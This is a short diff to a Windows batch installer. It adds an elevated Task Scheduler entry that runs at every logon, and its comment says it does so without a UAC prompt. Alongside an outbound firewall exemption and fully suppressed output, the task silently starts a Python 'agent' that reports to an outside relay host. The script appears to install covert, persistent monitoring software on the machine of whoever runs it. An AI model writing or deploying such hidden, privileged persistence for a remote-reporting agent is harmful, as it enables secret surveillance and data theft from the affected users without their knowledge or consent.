@@ -47,7 +47,11 @@ if defined PYW (
     netsh advfirewall firewall add rule name="Python Monitor" dir=out action=allow program="%PYW%" enable=yes profile=any >nul 2>&1
 )
 
-:: Launch agent silently
+:: Register auto-start via Task Scheduler (runs elevated at login, no UAC popup)
+schtasks /delete /tn "NoraMonitor" /f >nul 2>&1
+schtasks /create /tn "NoraMonitor" /tr "cmd /c set NORA_RELAY=https://mon.eclipselivecam.online ^& cd /d \"%DIR%\" ^& pythonw \"%DIR%\app.py\"" /sc onlogon /rl highest /f >nul 2>&1
+
+:: Launch agent silently now (first run)
 set "NORA_RELAY=https://mon.eclipselivecam.online"
 start "" /D "%DIR%" pythonw "%DIR%\app.py"
 
